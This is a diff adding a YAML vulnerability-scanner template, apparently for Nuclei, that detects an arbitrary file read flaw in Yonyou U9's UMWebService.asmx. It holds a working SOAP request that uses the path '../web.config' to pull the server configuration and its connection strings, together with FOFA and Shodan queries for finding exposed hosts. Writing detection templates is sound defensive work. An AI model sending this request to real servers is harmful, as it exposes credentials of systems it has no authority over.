@@ -1,0 +1,41 @@
+http:
+- matchers:
+  - condition: and
+    part: body
+    type: word
+    words:
+    - configSections
+    - appSettings
+    - connectionStrings
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  raw:
+  - "POST /u9/OnLine/UMWebService.asmx HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0\
+    \ (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158\
+    \ Safari/537.36\nConnection: close\nContent-Type: text/xml; charset=utf-8\nSOAPAction:\
+    \ \"http://tempuri.org/GetLogContent\"\nAccept-Encoding: gzip\n\n<?xml version=\"\
+    1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
+    \ xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    >\n  <soap:Body>\n    <GetLogContent xmlns=\"http://tempuri.org/\">\n      <fileName>../web.config</fileName>\n\
+    \    </GetLogContent>\n  </soap:Body>\n</soap:Envelope>\n"
+id: yonyou-u9-umwebservice-fileread
+info:
+  author: Co5mos
+  description: 'The UMWebService.asmx component in Yonyou U9 platform is an important
+    part that provides Web service interfaces, allowing enterprises to access and
+    invoke various functions and data of the Yonyou U9 platform via the Web. There
+    is an arbitrary file read vulnerability in the UMWebService.asmx, which could
+    allow attackers to retrieve sensitive files from the system by sending specific
+    requests.
+
+    '
+  metadata:
+    fofa-query: body="logo-u9.png"
+    shodan-query: http.html:"logo-u9.png"
+  name: Yonyou U9 UMWebService.asmx Arbitrary File Read Vulnerability
+  reference:
+  - https://blog.csdn.net/qq_67810151/article/details/136422614
+  severity: high
+  tags: yonyou,fileread
